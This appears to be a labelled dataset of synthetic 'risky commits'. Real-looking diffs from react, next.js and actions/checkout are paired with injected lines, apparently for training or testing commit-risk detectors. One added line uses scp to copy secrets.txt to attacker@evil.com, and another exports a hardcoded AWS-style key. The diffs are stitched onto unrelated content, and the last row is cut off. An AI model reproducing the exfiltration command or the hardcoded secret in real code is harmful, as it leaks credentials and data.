facebook/react,synthetic_157_8434,lauren,2025-10-15 12:40:39,Synthetic risky commit,run.sh,20,4,24,"hermes-eslint@^0.32.0: hermes-estree ""0.32.0"" hermes-parser ""0.32.0"" -hermes-estree@0.25.1: - version ""0.25.1"" - resolved ""https://registry.yarnpkg.com/hermes-estree/-/hermes-estree-0.25.1.tgz#6aeec17d1983b4eabf69721f3aa3eb705b17f480"" - integrity sha512-0wUoCcLp+5Ev5pDW2OriHC2MJCbwLwuRx+gAqMTOkGKJJiBCLjtrvy4PWUGn6MIVefecRpzoOZ/UV6iGdOr+Cw== - hermes-estree@0.29.1: version ""0.29.1"" resolved ""https://registry.yarnpkg.com/hermes-estree/-/hermes-estree-0.29.1.tgz#043c7db076e0e8ef8c5f6ed23828d1ba463ebcc5"" hermes-parser@0.32.0 hermes-parser@^0.32.0: dependencies: hermes-estree ""0.32.0"" -hermes-parser@^0.25.1: - version ""0.25.1"" - resolved ""https://registry.yarnpkg.com/hermes-parser/-/hermes-parser-0.25.1.tgz#5be0e487b2090886c62bd8a11724cd766d5f54d1"" - integrity sha512-6pEjquH3rqaI6cYAXYPcz9MS4rY6R4ngRgrgfDshRptUZIc3lw0MCIJIGDj9++mfySOuPTHB4nrSW99BCvOPIA== - dependencies: - hermes-estree ""0.25.1"" - homedir-polyfill@^1.0.0 homedir-polyfill@^1.0.1: version ""1.0.3"" resolved ""https://registry.yarnpkg.com/homedir-polyfill/-/homedir-polyfill-1.0.3.tgz#743298cef4e5af3e194161fbadcc2151d3a058e8""
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_158_2976,Joshua Hannaford,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,13,5,18,"function bindingToApi( async writeAllEntrypointsToDisk( appDirOnly: boolean - ): Promise<TurbopackResult<RawEntrypoints>> { + ): Promise<TurbopackResult<Partial<RawEntrypoints>>> { const napiEndpoints = (await binding.projectWriteAllEntrypointsToDisk( this._nativeProject appDirOnly - )) as TurbopackResult<NapiEntrypoints> + )) as TurbopackResult<Partial<NapiEntrypoints>> - return napiEntrypointsToRawEntrypoints(napiEndpoints) + if ('routes' in napiEndpoints) { + return napiEntrypointsToRawEntrypoints( + napiEndpoints as TurbopackResult<NapiEntrypoints> + ) + } else { + return { + issues: napiEndpoints.issues + diagnostics: napiEndpoints.diagnostics + } + } } entrypointsSubscribe() { - const subscription = subscribe<TurbopackResult<NapiEntrypoints>>( + const subscription = subscribe<TurbopackResult<NapiEntrypoints | {}>>( false async (callback) => binding.projectEntrypointsSubscribe(this._nativeProject callback) ) return (async function* () { for await (const entrypoints of subscription) { - yield napiEntrypointsToRawEntrypoints(entrypoints) + if ('routes' in (entrypoints as TurbopackResult<NapiEntrypoints>)) { + yield napiEntrypointsToRawEntrypoints( + entrypoints as TurbopackResult<NapiEntrypoints> + ) + } else { + yield { + issues: entrypoints.issues + diagnostics: entrypoints.diagnostics + } as TurbopackResult<{}> + } } })() } function bindingToApi( )) as TurbopackResult<WrittenEndpoint> } - async clientChanged(): Promise<AsyncIterableIterator<TurbopackResult<{}>>> { + async clientChanged(): Promise<AsyncIterableIterator<TurbopackResult>> { const clientSubscription = subscribe<TurbopackResult>( false async (callback) => function bindingToApi( async serverChanged( includeIssues: boolean - ): Promise<AsyncIterableIterator<TurbopackResult<{}>>> { + ): Promise<AsyncIterableIterator<TurbopackResult>> { const serverSubscription = subscribe<TurbopackResult>( false async (callback) => function bindingToApi( type: 'conflict' } break - default: + default: { const _exhaustiveCheck: never = routeType invariant( nativeRoute () => `Unknown route type: ${_exhaustiveCheck}` ) + } } routes.set(pathname route) }
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
actions/checkout,synthetic_159_9779,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,12,3,15,"} } ""node_modules/@babel/code-frame"": { - ""version"": ""7.24.2"" - ""resolved"": ""https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.24.2.tgz"" - ""integrity"": ""sha512-y5+tLQyV8pg3fsiln67BVLD1P13Eg4lh5RW9mF0zUuvLrv9uIQ4MCL+CRT+FTsBlBjcIan6PGsLcBN0m3ClUyQ=="" + ""version"": ""7.27.1"" + ""resolved"": ""https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.27.1.tgz"" + ""integrity"": ""sha512-cjQ7ZlQ0Mv3b47hABuTevyTuYN4i+loJKGeV9flcCgIK37cCXRh+L1bd3iBHlynerhQ7BhCkn2BPbQUL+rGqFg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/highlight"": ""^7.24.2"" - ""picocolors"": ""^1.0.0"" + ""@babel/helper-validator-identifier"": ""^7.27.1"" + ""js-tokens"": ""^4.0.0"" + ""picocolors"": ""^1.1.1"" } ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/helper-string-parser"": { - ""version"": ""7.24.1"" - ""resolved"": ""https://registry.npmjs.org/@babel/helper-string-parser/-/helper-string-parser-7.24.1.tgz"" - ""integrity"": ""sha512-2ofRCjnnA9y+wk8b9IAREroeUP02KHp431N2mhKniy2yKIDKpbrHv9eXwm8cBeWQYcJmzv5qKCu65P47eCF7CQ=="" + ""version"": ""7.27.1"" + ""resolved"": ""https://registry.npmjs.org/@babel/helper-string-parser/-/helper-string-parser-7.27.1.tgz"" + ""integrity"": ""sha512-qMlSxKbpRlAridDExk92nSobyDdpPijUq2DW6oDnUqd0iOGxmQjyqhMIihI9+zv4LPyZdRje2cavWPbCbWm3eA=="" ""dev"": true + ""license"": ""MIT"" ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/helper-validator-identifier"": { - ""version"": ""7.22.20"" - ""resolved"": ""https://registry.npmjs.org/@babel/helper-validator-identifier/-/helper-validator-identifier-7.22.20.tgz"" - ""integrity"": ""sha512-Y4OZ+ytlatR8AI+8KZfKuL5urKp7qey08ha31L8b3BwewJAoJamTzyvxPR/5D+KkdJCGPq/+8TukHBlY10FX9A=="" + ""version"": ""7.27.1"" + ""resolved"": ""https://registry.npmjs.org/@babel/helper-validator-identifier/-/helper-validator-identifier-7.27.1.tgz"" + ""integrity"": ""sha512-D2hP9eA+Sqx1kBZgzxZh0y1trbuU+JoDkiEwqhQ36nodYqJwyEIhPSdMNd7lOm/4io72luTPWH20Yda0xOuUow=="" ""dev"": true + ""license"": ""MIT"" ""engines"": { ""node"": "">=6.9.0"" } } } ""node_modules/@babel/helpers"": { - ""version"": ""7.24.4"" - ""resolved"": ""https://registry.npmjs.org/@babel/helpers/-/helpers-7.24.4.tgz"" - ""integrity"": ""sha512-FewdlZbSiwaVGlgT1DPANDuCHaDMiOo+D/IDYRFYjHOuv66xMSJ7fQwwODwRNAPkADIO/z1EoF/l2BCWlWABDw=="" - ""dev"": true - ""dependencies"": { - ""@babel/template"": ""^7.24.0"" - ""@babel/traverse"": ""^7.24.1"" - ""@babel/types"": ""^7.24.0"" - } - ""engines"": { - ""node"": "">=6.9.0"" - } - } - ""node_modules/@babel/highlight"": { - ""version"": ""7.24.2"" - ""resolved"": ""https://registry.npmjs.org/@babel/highlight/-/highlight-7.24.2.tgz"" - ""integrity"": ""sha512-Yac1ao4flkTxTteCDZLEvdxg2fZfz1v8M4QpaGypq/WPDqg3ijHYbDfs+LG5hvzSoqaSZ9/Z9lKSP3CjZjv+pA=="" + ""version"": ""7.28.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/helpers/-/helpers-7.28.2.tgz"" + ""integrity"": ""sha512-/V9771t+EgXz62aCcyofnQhGM8DQACbRhvzKFsXKC9QM+5MadF8ZmIm0crDMaz3+o0h0zXfJnd4EhbYbxsrcFw=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/helper-validator-identifier"": ""^7.22.20"" - ""chalk"": ""^2.4.2"" - ""js-tokens"": ""^4.0.0"" - ""picocolors"": ""^1.0.0"" + ""@babel/template"": ""^7.27.2"" + ""@babel/types"": ""^7.28.2"" } ""engines"": { ""node"": "">=6.9.0"" } } - ""node_modules/@babel/highlight/node_modules/ansi-styles"": { - ""version"": ""3.2.1"" - ""resolved"": ""https://registry.npmjs.org/ansi-styles/-/ansi-styles-3.2.1.tgz"" - ""integrity"": ""sha512-VT0ZI6kZRdTh8YyJw3SMbYm/u+NqfsAxEpWO0Pf9sq8/e94WxxOpPKx9FR1FlyCtOVDNOQ+8ntlqFxiRc+r5qA=="" - ""dev"": true - ""dependencies"": { - ""color-convert"": ""^1.9.0"" - } - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/highlight/node_modules/chalk"": { - ""version"": ""2.4.2"" - ""resolved"": ""https://registry.npmjs.org/chalk/-/chalk-2.4.2.tgz"" - ""integrity"": ""sha512-Mti+f9lpJNcwF4tWV8/OrTTtF1gZi+f8FqlyAdouralcFWFQWF2+NgCHShjkCb+IFBLq9buZwE1xckQU4peSuQ=="" - ""dev"": true - ""dependencies"": { - ""ansi-styles"": ""^3.2.1"" - ""escape-string-regexp"": ""^1.0.5"" - ""supports-color"": ""^5.3.0"" - } - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/highlight/node_modules/color-convert"": { - ""version"": ""1.9.3"" - ""resolved"": ""https://registry.npmjs.org/color-convert/-/color-convert-1.9.3.tgz"" - ""integrity"": ""sha512-QfAUtd+vFdAtFQcC8CCyYt1fYWxSqAiK2cSD6zDB8N3cpsEBAvRxp9zOGg6G/SHHJYAT88/az/IuDGALsNVbGg=="" - ""dev"": true - ""dependencies"": { - ""color-name"": ""1.1.3"" - } - } - ""node_modules/@babel/highlight/node_modules/color-name"": { - ""version"": ""1.1.3"" - ""resolved"": ""https://registry.npmjs.org/color-name/-/color-name-1.1.3.tgz"" - ""integrity"": ""sha512-72fSenhMw2HZMTVHeCA9KCmpEIbzWiQsjN+BHcBbS9vr1mtt+vJjPdksIBNUmKAW8TFUDPJK5SUU3QhE9NEXDw=="" - ""dev"": true - } - ""node_modules/@babel/highlight/node_modules/escape-string-regexp"": { - ""version"": ""1.0.5"" - ""resolved"": ""https://registry.npmjs.org/escape-string-regexp/-/escape-string-regexp-1.0.5.tgz"" - ""integrity"": ""sha512-vbRorB5FUQWvla16U8R/qgaFIya2qGzwDrNmCZuYKrbdSUMG6I1ZCGQRefkRVhuOkIGVne7BQ35DSfo1qvJqFg=="" - ""dev"": true - ""engines"": { - ""node"": "">=0.8.0"" - } - } - ""node_modules/@babel/highlight/node_modules/has-flag"": { - ""version"": ""3.0.0"" - ""resolved"": ""https://registry.npmjs.org/has-flag/-/has-flag-3.0.0.tgz"" - ""integrity"": ""sha512-sKJf1+ceQBr4SMkvQnBDNDtf4TXpVhVGateu0t918bl30FnbE2m4vNLX+VWe/dpjlb+HugGYzW7uQXH98HPEYw=="" - ""dev"": true - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/highlight/node_modules/supports-color"": { - ""version"": ""5.5.0"" - ""resolved"": ""https://registry.npmjs.org/supports-color/-/supports-color-5.5.0.tgz"" - ""integrity"": ""sha512-QjVjwdXIt408MIiAqCX4oUKsgU2EqAGzs2Ppkm4aQYbjm+ZEWEcW4SfFNTr4uMNZma0ey4f5lgLrkB0aX0QMow=="" + ""node_modules/@babel/parser"": { + ""version"": ""7.28.0"" + ""resolved"": ""https://registry.npmjs.org/@babel/parser/-/parser-7.28.0.tgz"" + ""integrity"": ""sha512-jVZGvOxOuNSsuQuLRTh13nU0AogFlw32w/MT+LV6D3sP5WdbW61E77RnkbaO2dUvmPAYrBDJXGn5gGS6tH4j8g=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""has-flag"": ""^3.0.0"" + ""@babel/types"": ""^7.28.0"" } - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/parser"": { - ""version"": ""7.24.4"" - ""resolved"": ""https://registry.npmjs.org/@babel/parser/-/parser-7.24.4.tgz"" - ""integrity"": ""sha512-zTvEBcghmeBma9QIGunWevvBAp4/Qu9Bdq+2k0Ot4fVMD6v3dsC9WOcRSKk7tRRyBM/53yKMJko9xOatGQAwSg=="" - ""dev"": true ""bin"": { ""parser"": ""bin/babel-parser.js"" } } } ""node_modules/@babel/runtime"": { - ""version"": ""7.24.4"" - ""resolved"": ""https://registry.npmjs.org/@babel/runtime/-/runtime-7.24.4.tgz"" - ""integrity"": ""sha512-dkxf7+hn8mFBwKjs9bvBlArzLVxVbS8usaPUDd5p2a9JCL9tB8OaOVN1isD4+Xyk4ns89/xeOmbQvgdK7IIVdA=="" + ""version"": ""7.28.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/runtime/-/runtime-7.28.2.tgz"" + ""integrity"": ""sha512-KHp2IflsnGywDjBWDkR9iEqiWSpc8GIi0lgTT3mOElT0PP1tG26P4tmFI2YvAdzgq9RGyoHZQEIEdZy6Ec5xCA=="" ""dev"": true - ""dependencies"": { - ""regenerator-runtime"": ""^0.14.0"" - } + ""license"": ""MIT"" ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/template"": { - ""version"": ""7.24.0"" - ""resolved"": ""https://registry.npmjs.org/@babel/template/-/template-7.24.0.tgz"" - ""integrity"": ""sha512-Bkf2q8lMB0AFpX0NFEqSbx1OkTHf0f+0j82mkw+ZpzBnkk7e9Ql0891vlfgi+kHwOk8tQjiQHpqh4LaSa0fKEA=="" + ""version"": ""7.27.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/template/-/template-7.27.2.tgz"" + ""integrity"": ""sha512-LPDZ85aEJyYSd18/DkjNh4/y1ntkE5KwUHWTiqgRxruuZL2F1yuHligVHLvcHY2vMHXttKFpJn6LwfI7cw7ODw=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/code-frame"": ""^7.23.5"" - ""@babel/parser"": ""^7.24.0"" - ""@babel/types"": ""^7.24.0"" + ""@babel/code-frame"": ""^7.27.1"" + ""@babel/parser"": ""^7.27.2"" + ""@babel/types"": ""^7.27.1"" } ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/types"": { - ""version"": ""7.24.0"" - ""resolved"": ""https://registry.npmjs.org/@babel/types/-/types-7.24.0.tgz"" - ""integrity"": ""sha512-+j7a5c253RfKh8iABBhywc8NSfP5LURe7Uh4qpsh6jc+aLJguvmIUBdjSdEMQv2bENrCR5MfRdjGo7vzS/ob7w=="" + ""version"": ""7.28.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/types/-/types-7.28.2.tgz"" + ""integrity"": ""sha512-ruv7Ae4J5dUYULmeXw1gmb7rYRz57OWCPM57pHojnLq/3Z1CK2lNSLTCVjxVk1F/TZHwOZZrOWi0ur95BbLxNQ=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/helper-string-parser"": ""^7.23.4"" - ""@babel/helper-validator-identifier"": ""^7.22.20"" - ""to-fast-properties"": ""^2.0.0"" + ""@babel/helper-string-parser"": ""^7.27.1"" + ""@babel/helper-validator-identifier"": ""^7.27.1"" } ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@eslint/eslintrc/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/@humanwhocodes/config-array/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/@octokit/endpoint"": { - ""version"": ""9.0.5"" - ""resolved"": ""https://registry.npmjs.org/@octokit/endpoint/-/endpoint-9.0.5.tgz"" - ""integrity"": ""sha512-ekqR4/+PCLkEBF6qgj8WqJfvDq65RH85OAgrtnVp1mSxaXF03u2xW/hUdweGS5654IlC0wkNYC18Z50tSYTAFw=="" + ""version"": ""9.0.6"" + ""resolved"": ""https://registry.npmjs.org/@octokit/endpoint/-/endpoint-9.0.6.tgz"" + ""integrity"": ""sha512-H1fNTMA57HbkFESSt3Y9+FBICv+0jFceJFPWDePYlR/iMGrwM5ph+Dd4XRQs+8X+PUFURLQgX9ChPfhJ/1uNQw=="" + ""license"": ""MIT"" ""dependencies"": { ""@octokit/types"": ""^13.1.0"" ""universal-user-agent"": ""^6.0.0"" ""integrity"": ""sha512-pGUdSP+eEPfZiQHNkZI0U01HLipxncisdJQB4G//OAmfeO8sqTQ9KRa0KF03TUPCziNsoXUrTg4B2Q1EX++T0Q=="" } ""node_modules/@octokit/plugin-paginate-rest"": { - ""version"": ""9.2.1"" - ""resolved"": ""https://registry.npmjs.org/@octokit/plugin-paginate-rest/-/plugin-paginate-rest-9.2.1.tgz"" - ""integrity"": ""sha512-wfGhE/TAkXZRLjksFXuDZdmGnJQHvtU/joFQdweXUgzo1XwvBCD4o4+75NtFfjfLK5IwLf9vHTfSiU3sLRYpRw=="" + ""version"": ""9.2.2"" + ""resolved"": ""https://registry.npmjs.org/@octokit/plugin-paginate-rest/-/plugin-paginate-rest-9.2.2.tgz"" + ""integrity"": ""sha512-u3KYkGF7GcZnSD/3UP0S7K5XUFT2FkOQdcfXZGZQPGv3lm4F2Xbf71lvjldr8c1H3nNbF+33cLEkWYbokGWqiQ=="" + ""license"": ""MIT"" ""dependencies"": { ""@octokit/types"": ""^12.6.0"" } } } ""node_modules/@octokit/request"": { - ""version"": ""8.4.0"" - ""resolved"": ""https://registry.npmjs.org/@octokit/request/-/request-8.4.0.tgz"" - ""integrity"": ""sha512-9Bb014e+m2TgBeEJGEbdplMVWwPmL1FPtggHQRkV+WVsMggPtEkLKPlcVYm/o8xKLkpJ7B+6N8WfQMtDLX2Dpw=="" + ""version"": ""8.4.1"" + ""resolved"": ""https://registry.npmjs.org/@octokit/request/-/request-8.4.1.tgz"" + ""integrity"": ""sha512-qnB2+SY3hkCmBxZsR/MPCybNmbJe4KAlfWErXq+rBKkQJlbjdJeS85VI9r8UqeLYLvnAenU8Q1okM/0MBsAGXw=="" + ""license"": ""MIT"" ""dependencies"": { - ""@octokit/endpoint"": ""^9.0.1"" - ""@octokit/request-error"": ""^5.1.0"" + ""@octokit/endpoint"": ""^9.0.6"" + ""@octokit/request-error"": ""^5.1.1"" ""@octokit/types"": ""^13.1.0"" ""universal-user-agent"": ""^6.0.0"" } } } ""node_modules/@octokit/request-error"": { - ""version"": ""5.1.0"" - ""resolved"": ""https://registry.npmjs.org/@octokit/request-error/-/request-error-5.1.0.tgz"" - ""integrity"": ""sha512-GETXfE05J0+7H2STzekpKObFe765O5dlAKUTLNGeH+x47z7JjXHfsHKo5z21D/o/IOZTUEI6nyWyR+bZVP/n5Q=="" + ""version"": ""5.1.1"" + ""resolved"": ""https://registry.npmjs.org/@octokit/request-error/-/request-error-5.1.1.tgz"" + ""integrity"": ""sha512-v9iyEQJH6ZntoENr9/yXxjuezh4My67CBSu9r6Ve/05Iu5gNgnisNWOsoJHTP6k0Rr0+HQIpnH+kyammu90q/g=="" + ""license"": ""MIT"" ""dependencies"": { ""@octokit/types"": ""^13.1.0"" ""deprecation"": ""^2.0.0"" ""integrity"": ""sha512-NzUnlZexiaH/46WDhANlyR2bXRopNg4F/zuSA3OpZnllCUgRaOF2znDioDWrmbNVsuZk6l9pMquQB38cfBZwkQ=="" } ""node_modules/brace-expansion"": { - ""version"": ""2.0.1"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-2.0.1.tgz"" - ""integrity"": ""sha512-XnAIvQ8eM+kC6aULx6wuQiwVsnzsi9d3WxzV3FpWTGA19F621kwdbsAcFKXgKUHZWsy+mY6iL1sHTxWEFCytDA=="" + ""version"": ""2.0.2"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-2.0.2.tgz"" + ""integrity"": ""sha512-Jt0vHyM+jmUBqojB7E1NIYadt0vI0Qxjxd2TErW94wDz+E2LAm5vKMXXwg6ZZBTHPuUlDgQHKXvjGBdfcF1ZDQ=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" } } } ""node_modules/cross-spawn"": { - ""version"": ""7.0.3"" - ""resolved"": ""https://registry.npmjs.org/cross-spawn/-/cross-spawn-7.0.3.tgz"" - ""integrity"": ""sha512-iRDPJKUPVEND7dHPO8rkbOnPpyDygcDFtWjpeWNCgy8WP2rXcxXL8TskReQl6OrB2G7+UJrags1q15Fudc7G6w=="" + ""version"": ""7.0.6"" + ""resolved"": ""https://registry.npmjs.org/cross-spawn/-/cross-spawn-7.0.6.tgz"" + ""integrity"": ""sha512-uV2QOWP2nWzsy2aMp8aRibhi9dlzF5Hgh5SHaB9OiTGEyDTiJJyx0uy51QXdyWbtAHNua4XJzUKca3OzKUd3vA=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""path-key"": ""^3.1.0"" ""shebang-command"": ""^2.0.0"" } } ""node_modules/eslint-plugin-import/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/eslint-plugin-jsx-a11y/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/eslint/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/glob/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/jake/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" ""version"": ""4.0.0"" ""resolved"": ""https://registry.npmjs.org/js-tokens/-/js-tokens-4.0.0.tgz"" ""integrity"": ""sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN4k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW/PKQ=="" - ""dev"": true + ""dev"": true + ""license"": ""MIT"" } ""node_modules/js-yaml"": { ""version"": ""4.1.0"" } } ""node_modules/micromatch"": { - ""version"": ""4.0.5"" - ""resolved"": ""https://registry.npmjs.org/micromatch/-/micromatch-4.0.5.tgz"" - ""integrity"": ""sha512-DMy+ERcEW2q8Z2Po+WNXuw3c5YaUSFjAO5GsJqfEl7UjvtIuFKO6ZrKvcItdy98dwFI2N1tg3zNIdKaQT+aNdA=="" + ""version"": ""4.0.8"" + ""resolved"": ""https://registry.npmjs.org/micromatch/-/micromatch-4.0.8.tgz"" + ""integrity"": ""sha512-PXwfBhYu0hBCPw8Dn0E+WDYb7af3dSLVWKi3HGv84IdF4TyFoC0ysxFd0Goxw7nSv4T/PzEJQxsYsEiFCKo2BA=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""braces"": ""^3.0.2"" + ""braces"": ""^3.0.3"" ""picomatch"": ""^2.3.1"" } ""engines"": { } } ""node_modules/picocolors"": { - ""version"": ""1.0.0"" - ""resolved"": ""https://registry.npmjs.org/picocolors/-/picocolors-1.0.0.tgz"" - ""integrity"": ""sha512-1fygroTLlHu66zi26VoTDv8yRgm0Fccecssto+MhsZ0D/DGW2sm8E8AjW7NU5VVTRt5GxbeZ5qBuJr+HyLYkjQ=="" - ""dev"": true + ""version"": ""1.1.1"" + ""resolved"": ""https://registry.npmjs.org/picocolors/-/picocolors-1.1.1.tgz"" + ""integrity"": ""sha512-xceH2snhtb5M9liqDsmEw56le376mTZkEX/jEb/RxNFyegNul7eNslCXP9FDj/Lcu0X8KEyMceP2ntpaHrDEVA=="" + ""dev"": true + ""license"": ""ISC"" } ""node_modules/picomatch"": { ""version"": ""2.3.1"" ""url"": ""https://github.com/sponsors/ljharb"" } } - ""node_modules/regenerator-runtime"": { - ""version"": ""0.14.1"" - ""resolved"": ""https://registry.npmjs.org/regenerator-runtime/-/regenerator-runtime-0.14.1.tgz"" - ""integrity"": ""sha512-dYnhHh0nJoMfnkZs6GmmhFknAGRrLznOu5nc9ML+EJxGvrx6H7teuevqVqCuPcPK//3eDrrjQhehXVx9cnkGdw=="" - ""dev"": true - } ""node_modules/regexp.prototype.flags"": { ""version"": ""1.5.2"" ""resolved"": ""https://registry.npmjs.org/regexp.prototype.flags/-/regexp.prototype.flags-1.5.2.tgz"" } } ""node_modules/test-exclude/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": 